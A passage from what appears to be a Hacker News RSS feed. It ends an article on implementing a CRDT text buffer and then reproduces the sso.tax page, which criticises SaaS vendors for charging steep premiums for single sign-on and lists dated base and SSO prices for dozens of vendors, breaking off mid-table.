        arbitrary but consistent order). When inserting before a character with the same parent, use its counter
        incremented by 1 to be ordered before it. This order is unique because doing this means the same site will never
        reuse the same counter in the same spot.
      </p>
    </li>
    <li>
      <p>
        To delete a character, put that character's identifier in a deleted set. Note that this means deleted characters
        persist forever, which is known as a "tombstone" in CRDT literature. Deleted character values can be forgotten
        but the positions must be remembered to be able to correctly order incoming changes that use one of the
        now-deleted characters as a parent.
      </p>
    </li>
  </ul>
  <p>
    This is not as expensive as it sounds because of three important optimizations:
  </p>
  <ul>
    <li>
      <p>
        Successive inserts from the same site can all be merged into a single block in memory, so for example pasting a
        large chunk of text uses the same amount of metadata as inserting a single character. This works because
        character identifiers are carefully designed to be able to be implicit in a contiguous run of text (each
        character will the same <code>site</code> and <code>counter</code> and have a <code>clock</code> that's 1 more
        than the previous character's <code>clock</code>).
      </p>
    </li>
    <li>
      <p>
        These blocks of memory can be stored contiguously in a single array that's pre-sorted in document order.
        Inserting a new block just involves inserting into that array at the correct position. This avoids needing to
        store the tree data structure explicitly (e.g. with arrays of children and/or sibling pointers) and also takes
        advantage of CPU optimizations for reading memory sequentially.
      </p>
    </li>
    <li>
      <p>
        The delete set can be represented more efficiently using a range-based representation. A series of deletes with
        the same <code>site</code> and with consecutive <code>clock</code> values can be represented with a single
        range. Note that this range is contiguous in identifier-space but not necessarily in document-space.
      </p>
    </li>
  </ul>
  <p>
    Below is a demo of what this looks like in practice. Each quadrant represents a peer, and peers send messages to
    each other with a simulated network delay. Click on a peer's text to edit it. Temporarily disable the simulated
    network with the pause button to construct simultaneous editing scenarios. You can use your browser's "view source"
    feature to view the <a href="https://madebyevan.com/algos/crdt-text-buffer/crdt-text-buffer.js">source code for this demo</a>.
  </p>

  </section>
  
  <section>

    <p>
      This technique has the following benefits and drawbacks:
    </p>
    <p>
      <b>Benefits:</b>
    </p>
    <ul>
      <li>
        <p>Memory usage: The metadata overhead needed to track collaborative edits is reasonable and is also likely to
          compress well as it contains runs of similar values.</p>
      </li>
      <li>
        <p>Performance: It's possible to implement most of the queries and/or updates to the data structure in O(log n)
          time using either binary trees or arrays with binary search.</p>
      </li>
    </ul>
    <p>
      <b>Drawbacks:</b>
    </p>
    <ul>
      <li>
        <p>Complexity: The logic for splitting and merging is complicated and hard to implement correctly. Fuzz testing
          is likely essential for a correct implementation.</p>
      </li>
      <li>
        <p>Grow-only: Deleting data does not reduce the size of the metadata. Addressing this properly is quite
          challenging as it involves coordinating between peers to ensure data is only removed when it's no longer
          needed by any peer in the system. It also can break down when a peer goes offline and never comes back online,
          but the system supports peers being offline for arbitrary lengths of time. This algorithm does not attempt to
          address that problem.</p>
      </li>
    </ul>

    <p>
      <b id="references">References:</b>
    </p>
    <p>
      Here are some excellent resources on CRDT text buffers that I found helpful when implementing this algorithm:
    </p>
    <ul>
      <li>
        <a href="https://josephg.com/blog/crdts-go-brrr/">https://josephg.com/blog/crdts-go-brrr/</a>
        <p>Talks about how to implement text-based CRDTs efficiently. Covers some of the optimizations used here
          including storing runs of text together and storing insertions in a flat list.</p>
      </li>
      <li>
        <a href="http://archagon.net/blog/2018/03/24/data-laced-with-history/">http://archagon.net/blog/2018/03/24/data-laced-with-history/</a>
        <p>Goes over tree-based indexing (which it calls "causal trees") in a lot of depth. Discusses a possible
          approach to distributed garbage collection as well as the complexities that come with it. Has lots of
          additional references at the bottom.</p>
      </li>
      <li>
        <a href="https://www.bartoszsypytkowski.com/yrs-architecture/">https://www.bartoszsypytkowski.com/yrs-architecture/</a>
        <p>Goes over the internals of Yjs in more detail, which is relevant because what I implemented is similar to
          what Yjs does. Some high-level differences are that a) Yjs doesn't store delete sets explicitly and sends all
          of them all over again each time syncing starts and b) Yjs gives each insert an additional rightward pointer
          for resolving ordering between children with the same parent.</p>
      </li>
      <li>
        <a href="https://www.inkandswitch.com/peritext/">https://www.inkandswitch.com/peritext/</a>
        <p>"Rich text" involves attaching formatting attributes (e.g. bold or italic) to individual characters. Doing
          this in a collaborative environment requires careful algorithm to preserve the original human intention after
          an automatic merge. This article presents a way to do that.</p>
      </li>
    </ul>

    
    
    

      </section>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Vendors that treat single sign-on as a luxury feature (275 pts)]]></title>
            <link>https://sso.tax/</link>
            <guid>44955457</guid>
            <pubDate>Tue, 19 Aug 2025 19:38:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sso.tax/">https://sso.tax/</a>, See on <a href="https://news.ycombinator.com/item?id=44955457">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content" role="main">
      

<details open="">
  <summary>
    <p>Why does this exist?</p>
  </summary>
  <p>Single sign-on (SSO) is a mechanism for outsourcing the authentication for your website (or other product) to a third party identity provider, such as Google, Okta, Entra ID (Azure AD), PingFederate, etc.</p>

  <p>In this context, SSO refers to a SaaS or similar vendor allowing a business client to manage user accounts via the client’s own identity provider, without having to rely on the vendor to provide strong authentication with audit logs, and with the ability to create and delete user accounts centrally, for all users, across all software in use by that client.</p>

  <p>For organizations with more than a handful of employees, this feature is critical for IT and Security teams to be able to effectively manage user accounts across dozens or hundreds of vendors, many of which don’t support features like TOTP 2FA or U2F. In the event that an employee leaves the company, it allows the IT team to immediately disable their access to all applications, rather than logging into 100 different user management portals.</p>

  <p>In short: SSO is a core security requirement for any company with more than five employees.</p>

  <p>SaaS vendors appear not to have received this message, however. SSO is often only available as part of “Enterprise” pricing, which assumes either a huge number of users (minimum seat count) or is force-bundled with other “Enterprise” features which may have no value to the company using the software.</p>

  <p>If companies claim to “take your security seriously”, then SSO should be available as a feature that is either:</p>

  <ol>
    <li>part of the core product, or</li>
    <li>an optional paid extra for a reasonable delta, or</li>
    <li>attached to a price tier, but with a reasonably small gap between the non-SSO tier and SSO tiers.</li>
  </ol>

  <p>Many vendors charge 2x, 3x, or 4x the base product pricing for access to SSO, which disincentivizes its use and encourages poor security practices.</p>
</details>

<h2 id="the-list">The List</h2>

<table>
<thead>
<tr><th>Vendor</th><th>Base Pricing</th><th>SSO Pricing</th><th>% Increase</th><th>Source</th><th>Date Updated</th></tr>
</thead>
<tbody>

<tr>
<td><a href="https://www.adobe.com/">Adobe Acrobat Pro</a></td>
<td>$23.99</td>
<td>$27.99</td>
<td>17%</td>
<td>


<a href="https://www.adobe.com/acrobat/pricing/business.html">🔗</a>

</td>
<td>2023-07-18</td>
</tr>

<tr>
<td><a href="https://www.adobe.com/">Adobe Creative Cloud</a></td>
<td>$84.99</td>
<td>$140.99</td>
<td>66%</td>
<td>


<a href="https://www.adobe.com/creativecloud/business-plans.html">🔗</a>

</td>
<td>2023-07-18</td>
</tr>

<tr>
<td><a href="https://airtable.com/">Airtable</a></td>
<td>$10 per u/m</td>
<td>$60 per u/m</td>
<td>500%</td>
<td>


<a href="https://airtable.com/pricing">🔗</a>

Quote</td>
<td>2019-10-19</td>
</tr>

<tr>
<td><a href="https://www.appsmith.com/">Appsmith</a></td>
<td>$15 per u/m</td>
<td>$2500<sup id="fnref:appsmith-price" role="doc-noteref"><a href="#fn:appsmith-price" rel="footnote">1</a></sup></td>
<td>16567%</td>
<td>


<a href="https://www.appsmith.com/pricing">🔗</a>

</td>
<td>2025-06-04</td>
</tr>

<tr>
<td><a href="https://asana.com/">Asana</a></td>
<td>$25 per u/m</td>
<td>$60 per u/m<sup id="fnref:asana-price" role="doc-noteref"><a href="#fn:asana-price" rel="footnote">2</a></sup></td>
<td>140%</td>
<td>


<a href="https://asana.com/pricing">🔗</a>

Quote</td>
<td>2020-12-09</td>
</tr>

<tr>
<td><a href="https://www.atlassian.com/">Atlassian (Jira Cloud)</a></td>
<td>$7.75 per u/m</td>
<td>$11.75 per u/m<sup id="fnref:jira-price" role="doc-noteref"><a href="#fn:jira-price" rel="footnote">3</a></sup></td>
<td>51%</td>
<td>


<a href="https://www.atlassian.com/software/access/pricing">🔗</a>

</td>
<td>2023-09-22</td>
</tr>

<tr>
<td><a href="https://balsamiq.com/">Balsamiq Wireframes</a></td>
<td>$9 per month</td>
<td>$14 per month</td>
<td>56%</td>
<td>


<a href="https://balsamiq.com/buy">🔗</a>

</td>
<td>2024-07-28</td>
</tr>

<tr>
<td><a href="https://bitwarden.com/">BitWarden</a></td>
<td>$4 per u/m</td>
<td>$6 per u/m</td>
<td>50%</td>
<td>


<a href="https://bitwarden.com/pricing/business">🔗</a>

</td>
<td>2024-08-28</td>
</tr>

<tr>
<td><a href="https://www.bitrise.io/">Bitrise</a></td>
<td>$90</td>
<td>$270</td>
<td>200%</td>
<td>


<a href="https://www.bitrise.io/pricing/teams">🔗</a>

</td>
<td>2019-06-25</td>
</tr>

<tr>
<td><a href="https://www.box.com/">Box</a></td>
<td>$5 per u/m</td>
<td>$15 per u/m</td>
<td>200%</td>
<td>


<a href="https://www.box.com/pricing">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://breezy.hr/">Breezy HR</a></td>
<td>$171 per month</td>
<td>$1500 per month<sup id="fnref:breezyhr-price" role="doc-noteref"><a href="#fn:breezyhr-price" rel="footnote">4</a></sup></td>
<td>777%</td>
<td>


<a href="https://breezy.hr/pricing">🔗</a>

Quote</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="">Calendly</a></td>
<td>$12 per u/m</td>
<td>$25 per u/m</td>
<td>108%</td>
<td>


<a href="https://www.calendly.com/pricing">🔗</a>

Quote</td>
<td>2022-03-03</td>
</tr>

<tr>
<td><a href="https://canva.com/">Canva</a></td>
<td>$10 per u/m<sup id="fnref:canva" role="doc-noteref"><a href="#fn:canva" rel="footnote">5</a></sup></td>
<td>$40 per u/m<sup id="fnref:canva:1" role="doc-noteref"><a href="#fn:canva" rel="footnote">5</a></sup></td>
<td>300%<sup id="fnref:canva:2" role="doc-noteref"><a href="#fn:canva" rel="footnote">5</a></sup></td>
<td>


<a href="https://www.canva.com/pricing/">🔗</a>

Quote</td>
<td>2024-06-17</td>
</tr>

<tr>
<td><a href="https://clockify.me/">Clockify</a></td>
<td>$3.99 per u/m</td>
<td>$11.99 per u/m</td>
<td>300%</td>
<td>


<a href="https://clockify.me/extra-features">🔗</a>

</td>
<td>2021-03-17</td>
</tr>

<tr>
<td><a href="https://cloudflare.com/">Cloudflare</a></td>
<td>$20 per d/m</td>
<td>$1000 per d/m<sup id="fnref:cloudflare-price" role="doc-noteref"><a href="#fn:cloudflare-price" rel="footnote">6</a></sup></td>
<td>4900%</td>
<td>


<a href="https://www.cloudflare.com/plans/">🔗</a>

Quote</td>
<td>2023-11-23</td>
</tr>

<tr>
<td><a href="https://copper.com/">Copper CRM</a></td>
<td>$49 per u/m</td>
<td>$119 per u/m</td>
<td>143%</td>
<td>


<a href="https://copper.com/pricing">🔗</a>

</td>
<td>2019-07-31</td>
</tr>

<tr>
<td><a href="">Coursera</a></td>
<td>$399 per u/y</td>
<td>$49875 per year<sup id="fnref:coursera" role="doc-noteref"><a href="#fn:coursera" rel="footnote">7</a></sup></td>
<td>12400%</td>
<td>


<a href="https://www.coursera.org/business/compare-plans">🔗</a>

</td>
<td>2023-10-22</td>
</tr>

<tr>
<td><a href="https://www.cypress.io/">Cypress.io</a></td>
<td>$75 per month</td>
<td>$300 per month</td>
<td>300%</td>
<td>


<a href="https://www.cypress.io/pricing#monthly">🔗</a>

</td>
<td>2023-10-31</td>
</tr>

<tr>
<td><a href="https://datocms.com/">DatoCMS</a></td>
<td>$100 per month</td>
<td>$667 per month</td>
<td>567%</td>
<td>


<a href="https://www.datocms.com/pricing">🔗</a>

Quote</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://deepl.com/">DeepL Translator</a></td>
<td>$10.49 per u/m</td>
<td>$34.49 per u/m</td>
<td>229%</td>
<td>


<a href="https://www.deepl.com/pro">🔗</a>

</td>
<td>2023-10-22</td>
</tr>

<tr>
<td><a href="https://dmarcian.com/">Dmarcian</a></td>
<td>$240/mo</td>
<td>$600/mo</td>
<td>150%</td>
<td>


<a href="https://dmarcian.com/pricing/">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://www.docker.com/">Docker</a></td>
<td>$9 per u/m</td>
<td>$24 per u/m</td>
<td>167%</td>
<td>


<a href="https://www.docker.com/pricing">🔗</a>

</td>
<td>2023-10-16</td>
</tr>

<tr>
<td><a href="https://www.docusign.com/">DocuSign</a></td>
<td>$25 per u/m</td>
<td>$50 per u/m</td>
<td>100%</td>
<td>


<a href="https://www.docusign.com/products-and-pricing">🔗</a>

Quote</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://www.dropbox.com/">Dropbox</a></td>
<td>$20 per u/m</td>
<td>$26 per u/m</td>
<td>30%</td>
<td>


<a href="https://www.dropbox.com/business/plans-comparison">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://elastic.co/">Elastic</a></td>
<td>$0.2992<sup id="fnref:elastic-note" role="doc-noteref"><a href="#fn:elastic-note" rel="footnote">8</a></sup></td>
<td>$0.3429</td>
<td>15%</td>
<td>


<a href="https://www.elastic.co/subscriptions">🔗</a>

</td>
<td>2021-02-12</td>
</tr>

<tr>
<td><a href="https://envoy.com/">Envoy</a></td>
<td>$99 per location/m</td>
<td>$299 per location/m</td>
<td>202%</td>
<td>


<a href="https://envoy.com/pricing/">🔗</a>

</td>
<td>2020-02-17</td>
</tr>

<tr>
<td><a href="https://www.expensify.com/">Expensify</a></td>
<td>$5 per u/m</td>
<td>$9 per u/m</td>
<td>80%</td>
<td>


<a href="https://www.expensify.com/pricing#features">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://www.figma.com/">Figma</a></td>
<td>$12 per u/m</td>
<td>$45 per u/m</td>
<td>275%</td>
<td>


<a href="https://www.figma.com/pricing">🔗</a>

</td>
<td>2019-10-19</td>
</tr>

<tr>
<td><a href="https://www.front.com/">Front</a></td>
<td>$19 per u/m</td>
<td>$99 per u/m</td>
<td>421%</td>
<td>


<a href="https://front.com/pricing">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://www.gitbook.com/">GitBook</a></td>
<td>$8 per u/m</td>
<td>$15 per u/m<sup id="fnref:gitbook-price" role="doc-noteref"><a href="#fn:gitbook-price" rel="footnote">9</a></sup></td>
<td>87.5%</td>
<td>


<a href="https://www.gitbook.com/pricing">🔗</a>

</td>
<td>2024-05-09</td>
</tr>

<tr>
<td><a href="https://www.github.com/">GitHub</a></td>
<td>$4 per u/m</td>
<td>$21 per u/m</td>
<td>425%</td>
<td>


<a href="https://github.com/pricing">🔗</a>

</td>
<td>2020-04-14</td>
</tr>

<tr>
<td><a href="https://www.hotjar.com/">Hotjar Observe</a></td>
<td>$39 per month</td>
<td>$213 per moth</td>
<td>446%</td>
<td>


<a href="https://www.hotjar.com/pricing/">🔗</a>

</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://www.hubspot.com/">Hubspot Marketing</a></td>
<td>$46 per month</td>
<td>$2944 per month</td>
<td>6300%</td>
<td>


<a href="https://www.hubspot.com/pricing/marketing">🔗</a>

</td>
<td>2018-11-23</td>
</tr>

<tr>
<td><a href="https://inedo.com/">Inedo (ProGet)</a></td>
<td>$1995 per year</td>
<td>$9995 per year</td>
<td>400%</td>
<td>


<a href="https://inedo.com/proget/pricing">🔗</a>

</td>
<td>2024-07-02</td>
</tr>

<tr>
<td><a href="https://www.intercom.com/">Intercom</a></td>
<td>$29</td>
<td>$132</td>
<td>355%</td>
<td>


<a href="https://www.intercom.com/pricing">🔗</a>

</td>
<td>2024-08-26</td>
</tr>

<tr>
<td><a href="https://jfrog.com/">JFrog</a></td>
<td>$98/mo</td>
<td>$699/mo<sup id="fnref:jfrog" role="doc-noteref"><a href="#fn:jfrog" rel="footnote">10</a></sup></td>
<td>613%</td>
<td>


<a href="https://jfrog.com/pricing/">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://www.keepersecurity.com/">Keeper Password Manager</a></td>
<td>$2 per u/m</td>
<td>$5 per u/m</td>
<td>150%</td>
<td>


<a href="https://www.keepersecurity.com/pricing/business-and-enterprise.html">🔗</a>

Quote</td>
<td>2023-10-16</td>
</tr>

<tr>
<td><a href="https://launchdarkly.com/">LaunchDarkly</a></td>
<td>$65 per u/m</td>
<td>$125 per u/m</td>
<td>92%</td>
<td>


<a href="https://launchdarkly.com/pricing/">🔗</a>

Quote</td>
<td>2020-01-24</td>
</tr>

<tr>
<td><a href="https://www.linear.app/">Linear</a></td>
<td>$10 per u/m</td>
<td>$15 per u/m</td>
<td>50%</td>
<td>


<a href="https://linear.app/pricing">🔗</a>

</td>
<td>2022-06-09</td>
</tr>

<tr>
<td><a href="https://www.liveagent.com/">LiveAgent</a></td>
<td>$9 per u/m</td>
<td>$49 per u/m</td>
<td>444%</td>
<td>


<a href="https://www.liveagent.com/pricing/">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://logrocket.com/">LogRocket</a></td>
<td>$99 per mo</td>
<td>$350 per mo<sup id="fnref:logrocket" role="doc-noteref"><a href="#fn:logrocket" rel="footnote">11</a></sup></td>
<td>254%</td>
<td>


<a href="https://logrocket.com/pricing">🔗</a>

</td>
<td>2024-01-12</td>
</tr>

<tr>
<td><a href="https://www.loom.com/">Loom</a></td>
<td>$12.50 per u/m</td>
<td>$45 per u/m</td>
<td>260%</td>
<td>


<a href="https://www.loom.com/pricing">🔗</a>

Quote</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://www.lucidchart.com/">Lucidchart</a></td>
<td>$9 per u/m</td>
<td>$20 per u/m</td>
<td>122%</td>
<td>


<a href="https://lucid.app/pricing/lucidchart">🔗</a>

Quote</td>
<td>2022-05-24</td>
</tr>

<tr>
<td><a href="https://www.mailjet.com/">Mailjet</a></td>
<td>$25 per month</td>
<td>$95 per month</td>
<td>280%</td>
<td>


<a href="https://documentation.mailjet.com/hc/en-us/articles/5216831817499-How-to-enable-SAML-SSO-with-Mailjet#h_01G01MC9HVB5DYRJKSERS9FHTK">🔗</a>


&amp;

<a href="https://www.mailjet.com/pricing/">🔗</a>

</td>
<td>2023-04-26</td>
</tr>

<tr>
<td><a href="https://mailtrap.io/">Mailtrap</a></td>
<td>$24.99 per month</td>
<td>$299.99 per month</td>
<td>1100%</td>
<td>


<a href="https://mailtrap.io/pricing/">🔗</a>

</td>
<td>2022-06-14</td>
</tr>

<tr>
<td><a href="https://www.mattermost.com/">Mattermost</a></td>
<td>$3.25 per u/m</td>
<td>$8.50 per u/m</td>
<td>162%</td>
<td>


<a href="https://mattermost.com/pricing/">🔗</a>

</td>
<td>2019-06-25</td>
</tr>

<tr>
<td><a href="https://www.metabase.com/">Metabase</a></td>
<td>$85 per month<sup id="fnref:metabase" role="doc-noteref"><a href="#fn:metabase" rel="footnote">12</a></sup></td>
<td>$500 per month</td>
<td>588%</td>
<td>


<a href="https://www.metabase.com/pricing/">🔗</a>

</td>
<td>2024-07-22</td>
</tr>

<tr>
<td><a href="https://miro.com/">Miro</a></td>
<td>$8 per u/m</td>
<td>$16 per u/m</td>
<td>100%</td>
<td>


<a href="https://miro.com/pricing/">🔗</a>

</td>
<td>2019-09-13</td>
</tr>

<tr>
<td><a href="https://mixpanel.com/">Mixpanel</a></td>
<td>$20 per month</td>
<td>$833 per month<sup id="fnref:mixpanel" role="doc-noteref"><a href="#fn:mixpanel" rel="footnote">13</a></sup></td>
<td>4065%</td>
<td>


<a href="https://mixpanel.com/pricing">🔗</a>

</td>
<td>2023-10-25</td>
</tr>

<tr>
<td><a href="https://monday.com/">Monday.com</a></td>
<td>$7 per u/m</td>
<td>$27 per u/m</td>
<td>286%</td>
<td>


<a href="https://monday.com/pricing/">🔗</a>

Quote</td>
<td>2020-05-26</td>
</tr>

<tr>
<td><a href="https://www.mural.co/">Mural</a></td>
<td>$10 per u/m</td>
<td>$18 per u/m</td>
<td>80%</td>
<td>


<a href="https://www.mural.co/pricing">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://www.netlify.com/">Netlify</a></td>
<td>$19 per u/m</td>
<td>$99 per u/m</td>
<td>421%</td>
<td>


<a href="https://www.netlify.com/pricing/">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://newrelic.com/products/infrastructure">New Relic Infrastructure</a></td>
<td>$0.60 - $7.20 per host-month<sup id="fnref:newrelic-price" role="doc-noteref"><a href="#fn:newrelic-price" rel="footnote">14</a></sup></td>
<td>$1.20 - $14.40 per host-month</td>
<td>100%</td>
<td>


<a href="https://newrelic.com/products/infrastructure/pricing">🔗</a>

</td>
<td>2018-10-18</td>
</tr>

<tr>
<td><a href="https://www.notion.so/">Notion</a></td>
<td>$8 per u/m</td>
<td>$15 per u/m</td>
<td>88%</td>
<td>


<a href="https://www.notion.so/pricing">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://www.opsgenie.com/">OpsGenie</a></td>
<td>$9 per u/m</td>
<td>$19 per u/m</td>
<td>111%</td>
<td>


<a href="https://www.opsgenie.com/pricing">🔗</a>

</td>
<td>2018-11-08</td>
</tr>

<tr>
<td><a href="https://www.optisigns.com/">OptiSigns</a></td>
<td>$10 per device/m</td>
<td>$15 per device/m</td>
<td>50%</td>
<td>


<a href="https://www.optisigns.com/pricing">🔗</a>

</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://pagertree.com/">PagerTree</a></td>
<td>$10 per u/m</td>
<td>$15 per u/m</td>
<td>50%</td>
<td>


<a href="https://pagertree.com/pricing/">🔗</a>

</td>
<td>2018-11-08</td>
</tr>

<tr>
<td><a href="https://www.pandadoc.com/">PandaDoc</a></td>
<td>$19 per u/m</td>
<td>$59 per u/m<sup id="fnref:pandadoc" role="doc-noteref"><a href="#fn:pandadoc" rel="footnote">15</a></sup></td>
<td>210%</td>
<td>


<a href="https://www.pandadoc.com/pricing/">🔗</a>

Quote</td>
<td>2019-10-16</td>
</tr>

<tr>
<td><a href="https://phrase.com/">Phrase</a></td>
<td>$29 per u/m</td>
<td>$369 per u/m</td>
<td>1172%</td>
<td>


<a href="https://phrase.com/pricing/">🔗</a>

</td>
<td>2023-10-22</td>
</tr>

<tr>
<td><a href="https://pitch.com/">Pitch</a></td>
<td>€10 per u/m</td>
<td>€30 per u/m</td>
<td>200%</td>
<td>


<a href="https://pitch.com/pricing">🔗</a>

</td>
<td>2024-02-05</td>
</tr>

<tr>
<td><a href="https://www.playvox.com/">Playvox</a></td>
<td>$15 per u/m</td>
<td>$30 per u/m</td>
<td>100%</td>
<td>


<a href="https://www.playvox.com/pricing">🔗</a>

</td>
<td>2020-06-09</td>
</tr>

<tr>
<td><a href="https://www.postman.com/">Postman</a></td>
<td>$14 per u/m</td>
<td>$49 per u/m</td>
<td>250%</td>
<td>


<a href="https://www.postman.com/pricing">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://www.projectmanager.com/">Project Manager</a></td>
<td>$11.50 per u/m</td>
<td>$45 per u/m</td>
<td>291%</td>
<td>


<a href="https://www.projectmanager.com/pricing">🔗</a>

Quote</td>
<td>2022-03-30</td>
</tr>

<tr>
<td><a href="https://quip.com/">Quip</a></td>
<td>$10 per u/m</td>
<td>$25 per u/m</td>
<td>150%</td>
<td>


<a href="https://quip.com/about/pricing">🔗</a>

</td>
<td>2019-02-15</td>
</tr>

<tr>
<td><a href="https://raygun.com/">Raygun</a></td>
<td>$79/mo<sup id="fnref:raygun" role="doc-noteref"><a href="#fn:raygun" rel="footnote">16</a></sup></td>
<td>$649/mo</td>
<td>721%</td>
<td>


<a href="https://raygun.com/platform/crash-reporting">🔗</a>

</td>
<td>2019-10-10</td>
</tr>

<tr>
<td><a href="https://readme.com/">ReadMe</a></td>
<td>$99 per project/mo</td>
<td>$3000 per project/mo</td>
<td>2930%</td>
<td>


<a href="https://readme.com/pricing">🔗</a>

</td>
<td>2024-02-25</td>
</tr>

<tr>
<td><a href="https://recruitee.com/">Recruitee</a></td>
<td>$199 per month</td>
<td>$274 per month</td>
<td>35%</td>
<td>


<a href="https://recruitee.com/pricing">🔗</a>

</td>
<td>2024-08-07</td>
</tr>

<tr>
<td><a href="https://www.retrium.com/">Retrium</a></td>
<td>$39 per month</td>
<td>$59 per month</td>
<td>51%</td>
<td>


<a href="https://www.retrium.com/pricing">🔗</a>

</td>
<td>2022-06-07</td>
</tr>

<tr>
<td><a href="https://www.riddle.com/">Riddle</a></td>
<td>$59 per month</td>
<td>$749 per month</td>
<td>1169%</td>
<td>


<a href="https://www.riddle.com/pricing">🔗</a>

</td>
<td>2023-07-24</td>
</tr>

<tr>
<td><a href="https://www.ringcentral.com/">RingCentral</a></td>
<td>$25 per u/m</td>
<td>$35 per u/m</td>
<td>40%</td>
<td>


<a href="https://www.ringcentral.com/office/plansandpricing.html">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://rocket.chat/">Rocket.Chat Cloud</a></td>
<td>$2 per u/m</td>
<td>$4 per u/m</td>
<td>100%</td>
<td>


<a href="https://rocket.chat/pricing#cloud">🔗</a>

</td>
<td>2018-10-22</td>
</tr>

<tr>
<td><a href="https://rollbar.com/developer/">Rollbar</a></td>
<td>$19 per month (25k events)</td>
<td>$39 per month (25K events)<sup id="fnref:rollbar" role="doc-noteref"><a href="#fn:rollbar" rel="footnote">17</a></sup></td>
<td>105%</td>
<td>


<a href="https://rollbar.com/pricing/">🔗</a>

</td>
<td>2024-11-08</td>
</tr>

<tr>
<td><a href="https://runway.team/">Runway</a></td>
<td>$499 per app/mo</td>
<td>$2,166.67 per app/mo</td>
<td>334%</td>
<td>


<a href="https://www.runway.team/pricing">🔗</a>

</td>
<td>2023-10-02</td>
</tr>

<tr>
<td><a href="https://www.sanity.io/">Sanity</a></td>
<td>$15 per u/m</td>
<td>$70.96 per u/m<sup id="fnref:sanity" role="doc-noteref"><a href="#fn:sanity" rel="footnote">18</a></sup></td>
<td>350%</td>
<td>


<a href="https://www.sanity.io/pricing">🔗</a>

</td>
<td>2024-01-23</td>
</tr>

<tr>
<td><a href="https://sendgrid.com/">Sendgrid</a></td>
<td>$20 per month</td>
<td>$90 per month</td>
<td>350%</td>
<td>


<a href="https://sendgrid.com/pricing/">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://sentry.io/">Sentry</a></td>
<td>$26 for 100K events<sup id="fnref:sentry" role="doc-noteref"><a href="#fn:sentry" rel="footnote">19</a></sup></td>
<td>$80 for 100K events</td>
<td>208%</td>
<td>


<a href="https://sentry.io/pricing/">🔗</a>

</td>
<td>2018-10-20</td>
</tr>

<tr>
<td><a href="https://slack.com/">Slack</a></td>
<td>$7.25 per u/m</td>
<td>$12.50 per u/m</td>
<td>72%</td>
<td>


<a href="https://slack.com/pricing">🔗</a>

</td>
<td>2023-06-29</td>
</tr>

<tr>
<td><a href="https://snyk.io/">Snyk</a></td>
<td>$23.96 per u/m</td>
<td>$39.98 per u/m</td>
<td>67%</td>
<td>


<a href="https://snyk.io/plans">🔗</a>

</td>
<td>2018-10-22</td>
</tr>

<tr>
<td><a href="https://stoplight.io/">Stoplight</a></td>
<td>$99 per u/m</td>
<td>$319 per u/m</td>
<td>222%</td>
<td>


<a href="https://stoplight.io/pricing">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://temporal.io/">Temporal Cloud</a></td>
<td>$200 per month<sup id="fnref:temporal" role="doc-noteref"><a href="#fn:temporal" rel="footnote">20</a></sup></td>
<td>$400+ per month<sup id="fnref:temporal:1" role="doc-noteref"><a href="#fn:temporal" rel="footnote">20</a></sup></td>
<td>100%+</td>
<td>


<a href="https://temporal.io/pricing">🔗</a>


&amp;

<a href="https://docs.temporal.io/cloud/pricing#sso-and-saml">🔗</a>

</td>
<td>2024-12-27</td>
</tr>

<tr>
<td><a href="https://www.gurock.com/testrail/">TestRail Cloud</a></td>
<td>$36 per u/m</td>
<td>$69 per u/m</td>
<td>92%</td>
<td>


<a href="https://www.gurock.com/testrail/pricing/cloud-enterprise">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://textexpander.com/">TextExpander</a></td>
<td>$8.83 per u/m</td>
<td>$13 per u/m<sup id="fnref:textexpander" role="doc-noteref"><a href="#fn:textexpander" rel="footnote">21</a></sup></td>
<td>47%</td>
<td>


<a href="https://textexpander.com/pricing">🔗</a>

Quote</td>
<td>2023-10-16</td>
</tr>

<tr>
<td><a href="https://trello.com/">Trello</a></td>
<td>$10 per u/m</td>
<td>$21 per u/m</td>
<td>110%</td>
<td>


<a href="https://trello.com/pricing">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://twilio.com/">Twilio</a></td>
<td>???</td>
<td>$3500 per month<sup id="fnref:twilio" role="doc-noteref"><a href="#fn:twilio" rel="footnote">22</a></sup></td>
<td>???%</td>
<td>


<a href="https://www.twilio.com/editions">🔗</a>

Quote</td>
<td>2024-10-08</td>
</tr>

<tr>
<td><a href="https://victorops.com/">VictorOps</a></td>
<td>$29 per u/m</td>
<td>$49 per u/m<sup id="fnref:victorops" role="doc-noteref"><a href="#fn:victorops" rel="footnote">23</a></sup></td>
<td>69%</td>
<td>


<a href="https://victorops.com/pricing">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="">Wix</a></td>
<td>$36 per month</td>
<td>$500 per month</td>
<td>1289%</td>
<td>


<a href="https://www.wix.com/plans">🔗</a>

Quote</td>
<td>2024-09-05</td>
</tr>

<tr>
<td><a href="https://www.workable.com/">Workable</a></td>
<td>$313 per month</td>
<td>$628 per month</td>
